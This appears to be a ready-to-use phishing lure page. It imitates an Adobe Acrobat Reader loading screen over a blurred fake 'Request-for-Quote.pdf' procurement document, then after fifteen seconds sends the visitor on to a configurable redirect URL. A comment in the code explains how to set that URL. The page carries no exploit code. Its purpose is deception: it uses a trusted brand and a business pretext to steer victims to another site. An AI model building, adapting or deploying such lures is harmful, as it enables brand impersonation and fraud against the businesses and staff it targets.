<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Adobe Acrobat Reader</title>
    <style>
      :root {
        color-scheme: light;
        --adobe-red: #ed2224;
        --ink: #1f1f1f;
        --muted: #666;
        --border: #dedede;
        --surface: #fff;
        --background: #f6f6f6;
        --shadow: 0 24px 80px rgba(0, 0, 0, 0.16);
        --spin-duration: 15000ms;
      }

      * {
        box-sizing: border-box;
      }

      body {
        margin: 0;
        min-height: 100vh;
        overflow-x: hidden;
        font-family: Arial, Helvetica, sans-serif;
        color: var(--ink);
        background:
          radial-gradient(circle at top left, rgba(237, 34, 36, 0.16), transparent 34rem),
          linear-gradient(135deg, #fff 0%, var(--background) 50%, #ededed 100%);
      }

      .page-shell {
        position: relative;
        display: grid;
        min-height: 100vh;
        place-items: center;
        padding: 2rem;
        isolation: isolate;
      }

      .pdf-backdrop {
        position: absolute;
        inset: 1vh 0;
        z-index: -2;
        display: grid;
        place-items: center;
        opacity: 0.86;
        filter: blur(18px);
      }

      .pdf-page {
        width: min(68vw, 46rem);
        min-height: min(96vh, 62rem);
        aspect-ratio: 8.5 / 11;
        padding: clamp(1.8rem, 3vw, 2.8rem);
        background: #fff;
        border: 1px solid #d0d0d0;
        border-radius: 0.4rem;
        box-shadow: 0 32px 90px rgba(0, 0, 0, 0.22);
      }

      .pdf-toolbar {
        display: flex;
        gap: 0.7rem;
        align-items: center;
        padding-bottom: 1.3rem;
        margin-bottom: 1.8rem;
        border-bottom: 1px solid #ddd;
      }

      .pdf-dot {
        width: 0.7rem;
        height: 0.7rem;
        background: var(--adobe-red);
        border-radius: 50%;
      }

      .pdf-title-bar {
        width: 45%;
        height: 0.8rem;
        background: #d8d8d8;
        border-radius: 999px;
      }

      .rfq-header {
        display: flex;
        justify-content: space-between;
        gap: 2rem;
        align-items: flex-start;
        margin-bottom: 2rem;
      }

      .rfq-company,
      .viewer-company {
        margin: 0 0 0.75rem;
        color: var(--adobe-red);
        font-size: 0.88rem;
        font-weight: 800;
        letter-spacing: 0.08em;
        text-transform: uppercase;
      }

      .viewer-company {
        margin-bottom: 1rem;
      }

      .rfq-kicker {
        margin: 0 0 0.45rem;
        color: var(--adobe-red);
        font-size: 0.95rem;
        font-weight: 800;
        letter-spacing: 0.12em;
        text-transform: uppercase;
      }

      .rfq-title {
        margin: 0;
        font-size: clamp(2.1rem, 4.8vw, 4.1rem);
        line-height: 0.92;
        letter-spacing: -0.08em;
        text-transform: uppercase;
      }

      .rfq-number {
        min-width: 10rem;
        padding: 1rem;
        text-align: right;
        border: 1px solid #d8d8d8;
        border-radius: 0.3rem;
      }

      .rfq-number strong,
      .rfq-label {
        display: block;
        color: #777;
        font-size: 0.72rem;
        letter-spacing: 0.08em;
        text-transform: uppercase;
      }

      .rfq-number span {
        display: block;
        margin-top: 0.35rem;
        font-size: 1.25rem;
        font-weight: 800;
      }

      .rfq-grid {
        display: grid;
        grid-template-columns: repeat(2, minmax(0, 1fr));
        gap: 1.25rem;
        margin-bottom: 1.7rem;
      }

      .rfq-block {
        min-height: 7.5rem;
        padding: 1rem;
        border: 1px solid #d8d8d8;
        border-radius: 0.3rem;
      }

      .rfq-line {
        height: 0.65rem;
        margin: 0.7rem 0;
        background: #d5d5d5;
        border-radius: 999px;
      }

      .rfq-line.short {
        width: 48%;
      }

      .rfq-line.medium {
        width: 72%;
      }

      .rfq-line.long {
        width: 92%;
      }

      .rfq-table {
        width: 100%;
        overflow: hidden;
        border: 1px solid #d3d3d3;
        border-radius: 0.35rem;
      }

      .rfq-row {
        display: grid;
        grid-template-columns: 2.2fr 0.8fr 0.9fr 1fr;
        gap: 0.75rem;
        align-items: center;
        padding: 0.9rem 1rem;
        border-bottom: 1px solid #e0e0e0;
      }

      .rfq-row:last-child {
        border-bottom: 0;
      }

      .rfq-row.header {
        color: #fff;
        font-size: 0.78rem;
        font-weight: 800;
        letter-spacing: 0.07em;
        text-transform: uppercase;
        background: #333;
      }

      .rfq-cell-line {
        display: block;
        height: 0.65rem;
        background: #d2d2d2;
        border-radius: 999px;
      }

      .rfq-total {
        display: flex;
        justify-content: flex-end;
        margin-top: 1.5rem;
      }

      .rfq-total-box {
        width: min(52%, 18rem);
        padding: 1rem;
        border: 1px solid #d3d3d3;
        border-radius: 0.35rem;
      }

      .pdf-watermark {
        display: grid;
        width: 8rem;
        height: 8rem;
        margin: 2.2rem auto 1rem;
        place-items: center;
        color: rgba(237, 34, 36, 0.22);
        font-size: 1.8rem;
        font-weight: 800;
        border: 0.35rem solid rgba(237, 34, 36, 0.18);
        border-radius: 50%;
      }

      .top-document-name {
        position: absolute;
        top: clamp(1rem, 3vw, 2rem);
        left: 50%;
        z-index: 1;
        max-width: min(calc(100vw - 2rem), 28rem);
        padding: 0.7rem 1rem;
        overflow: hidden;
        color: #333;
        font-size: 0.95rem;
        font-weight: 700;
        text-overflow: ellipsis;
        white-space: nowrap;
        background: rgba(255, 255, 255, 0.9);
        border: 1px solid rgba(222, 222, 222, 0.95);
        border-radius: 999px;
        box-shadow: 0 0.75rem 2rem rgba(0, 0, 0, 0.1);
        transform: translateX(-50%);
      }

      .viewer-loading {
        display: grid;
        width: min(100%, 20rem);
        justify-items: center;
        gap: 0.85rem;
        padding: 1.5rem;
        text-align: center;
        animation: fadeIn 0.32s ease both;
      }

      .viewer-loading.fade-out {
        animation: fadeOut 0.28s ease forwards;
      }

      .viewer-loading .viewer-company {
        margin-bottom: 0;
      }

      .viewer-loading h1 {
        margin: 0;
        font-size: 1.12rem;
        letter-spacing: -0.01em;
      }

      .viewer-loading p {
        margin: 0;
        color: var(--muted);
        font-size: 0.94rem;
      }

      .spinner {
        flex: 0 0 auto;
        position: relative;
        display: grid;
        width: 4.4rem;
        height: 4.4rem;
        place-items: center;
        background: rgba(255, 255, 255, 0.82);
        border: 0;
        border-radius: 50%;
        box-shadow: 0 0 0 0.45rem rgba(237, 34, 36, 0.08);
      }

      .spinner::before {
        position: absolute;
        inset: 0;
        content: "";
        border: 0.35rem solid #f4c6c6;
        border-top-color: var(--adobe-red);
        border-radius: inherit;
        animation: spin 0.65s linear infinite;
      }

      .spinner-logo {
        position: relative;
        z-index: 1;
        width: 2.35rem;
        height: 2.35rem;
        object-fit: contain;
        border-radius: 0.55rem;
      }

      .loading-dots::after {
        display: inline-block;
        width: 1.2em;
        content: "";
        animation: dots 1.1s steps(4, end) infinite;
      }

      .opening-progress {
        position: relative;
        width: min(100%, 19rem);
        height: 0.45rem;
        margin-top: 1rem;
        overflow: hidden;
        background: #f2cccc;
        border-radius: 999px;
      }

      .opening-progress::before {
        position: absolute;
        inset: 0;
        width: 100%;
        content: "";
        background: var(--adobe-red);
        border-radius: inherit;
        transform: scaleX(0);
        transform-origin: left center;
        animation: progressFill var(--spin-duration) linear forwards;
      }

      @keyframes spin {
        to {
          transform: rotate(360deg);
        }
      }

      @keyframes progressFill {
        to {
          transform: scaleX(1);
        }
      }

      @keyframes dots {
        0% {
          content: "";
        }

        25% {
          content: ".";
        }

        50% {
          content: "..";
        }

        75%,
        100% {
          content: "...";
        }
      }

      @keyframes fadeIn {
        from {
          opacity: 0;
          transform: translateY(0.4rem);
        }

        to {
          opacity: 1;
          transform: translateY(0);
        }
      }

      @keyframes fadeOut {
        to {
          opacity: 0;
          transform: translateY(-0.35rem);
        }
      }

      @media (max-width: 35rem) {
        .page-shell {
          padding: 1rem;
        }

        .pdf-backdrop {
          inset: 4vh 0;
          opacity: 0.34;
        }

        .pdf-page {
          width: min(92vw, 32rem);
          min-height: 48rem;
          padding: 1.6rem;
        }

        .rfq-header,
        .rfq-grid {
          grid-template-columns: 1fr;
        }

        .rfq-header {
          display: grid;
        }

        .rfq-number {
          text-align: left;
        }

        .rfq-row {
          grid-template-columns: 1.6fr 0.7fr 0.8fr 0.8fr;
          gap: 0.55rem;
          padding-inline: 0.7rem;
        }
      }
    </style>
  </head>
  <body>
    <main class="page-shell">
      <div id="top-document-name" class="top-document-name">Request-for-Quote.pdf</div>

      <div class="pdf-backdrop opening-backdrop" id="pdf-backdrop" aria-hidden="true">
        <div class="pdf-page">
          <div class="pdf-toolbar">
            <span class="pdf-dot"></span>
            <span class="pdf-title-bar"></span>
          </div>
          <p class="rfq-company" id="rfq-company-name">Renovation Sells. RFQ</p>
          <div class="rfq-header">
            <div>
              <p class="rfq-kicker">Procurement document</p>
              <h2 class="rfq-title">Request<br>for Quote</h2>
            </div>
            <div class="rfq-number">
              <strong>RFQ number</strong>
              <span>RFQ-2026-0718</span>
            </div>
          </div>
          <div class="rfq-grid">
            <div class="rfq-block">
              <span class="rfq-label">Requested by</span>
              <div class="rfq-line long"></div>
              <div class="rfq-line medium"></div>
              <div class="rfq-line short"></div>
            </div>
            <div class="rfq-block">
              <span class="rfq-label">Vendor response due</span>
              <div class="rfq-line medium"></div>
              <div class="rfq-line long"></div>
              <div class="rfq-line short"></div>
            </div>
          </div>
          <div class="rfq-table">
            <div class="rfq-row header">
              <span>Description</span>
              <span>Qty</span>
              <span>Unit</span>
              <span>Total</span>
            </div>
            <div class="rfq-row">
              <span class="rfq-cell-line"></span>
              <span class="rfq-cell-line"></span>
              <span class="rfq-cell-line"></span>
              <span class="rfq-cell-line"></span>
            </div>
            <div class="rfq-row">
              <span class="rfq-cell-line"></span>
              <span class="rfq-cell-line"></span>
              <span class="rfq-cell-line"></span>
              <span class="rfq-cell-line"></span>
            </div>
            <div class="rfq-row">
              <span class="rfq-cell-line"></span>
              <span class="rfq-cell-line"></span>
              <span class="rfq-cell-line"></span>
              <span class="rfq-cell-line"></span>
            </div>
            <div class="rfq-row">
              <span class="rfq-cell-line"></span>
              <span class="rfq-cell-line"></span>
              <span class="rfq-cell-line"></span>
              <span class="rfq-cell-line"></span>
            </div>
          </div>
          <div class="rfq-total">
            <div class="rfq-total-box">
              <span class="rfq-label">Estimated total</span>
              <div class="rfq-line long"></div>
              <div class="rfq-line medium"></div>
            </div>
          </div>
          <div class="pdf-watermark">PDF</div>
        </div>
      </div>

      <div id="viewer-loading" class="viewer-loading" role="status" aria-live="polite">
        <div class="spinner" aria-hidden="true">
          <img id="spinner-logo" class="spinner-logo" src="./adobe-logo.svg" alt="">
        </div>
        <p class="viewer-company">Adobe Acrobat Reader</p>
        <h1>Opening <span id="opening-file-name">Request-for-Quote.pdf</span><span class="loading-dots" aria-hidden="true"></span></h1>
        <p id="redirect-message">Rendering document preview</p>
        <div class="opening-progress" aria-hidden="true"></div>
      </div>
    </main>

    <!--
      Edit redirectUrl to choose where the page goes after the loading screen.
      loadingDelayMs controls how long the loading screen stays visible.
    -->
    <script type="application/json" id="page-config">
      {
        "companyName": "Renovation Sells. RFQ",
        "documentName": "Request-for-Quote.pdf",
        "logoPath": "./adobe-logo.svg",
        "loadingDelayMs": 15000,
        "redirectUrl": "https://example.com",
        "statusMessage": "Rendering document preview"
      }
    </script>

    <script>
      const configElement = document.querySelector("#page-config");
      const rfqCompanyName = document.querySelector("#rfq-company-name");
      const topDocumentName = document.querySelector("#top-document-name");
      const openingFileName = document.querySelector("#opening-file-name");
      const redirectMessage = document.querySelector("#redirect-message");
      const logoImage = document.querySelector("#spinner-logo");

      const config = JSON.parse(configElement.textContent);
      const configuredCompanyName = config.companyName || "Renovation Sells. RFQ";
      const configuredDocumentName = config.documentName || "Request-for-Quote.pdf";
      const configuredLogoPath = config.logoPath || "./adobe-logo.svg";
      const loadingDelayMs = Number(config.loadingDelayMs) || 15000;
      const redirectUrl = String(config.redirectUrl || "").trim();
      const redirectMessageText = config.statusMessage || "Rendering document preview";

      document.documentElement.style.setProperty("--spin-duration", `${loadingDelayMs}ms`);

      rfqCompanyName.textContent = configuredCompanyName;
      topDocumentName.textContent = configuredDocumentName;
      openingFileName.textContent = configuredDocumentName;
      redirectMessage.textContent = redirectMessageText;
      logoImage.src = configuredLogoPath;
      logoImage.addEventListener("error", () => {
        logoImage.hidden = true;
      });

      window.setTimeout(() => {
        if (redirectUrl) {
          window.location.assign(redirectUrl);
          return;
        }

        redirectMessage.textContent = "No redirect URL has been configured.";
      }, loadingDelayMs);
    </script>
  </body>
</html>
